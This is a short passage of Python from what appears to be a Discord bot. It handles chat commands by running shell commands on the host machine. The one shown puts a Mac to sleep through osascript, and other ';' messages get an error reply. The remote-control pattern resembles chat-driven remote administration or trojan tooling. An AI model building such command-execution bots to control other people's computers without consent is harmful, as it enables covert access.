            subprocess.call('echo \'tell application "Finder" to sleep\' | osascript', shell=True)
            await message.reply(f"Turned {os.getlogin()}'s Monitor Display Off")
            

    else:
        if message.content.startswith(";"):
            if message.author.id == client.user.id:
                return
            else:
                await message.reply(f"{message.content} Is An Invalid CMD!")

client.run(token)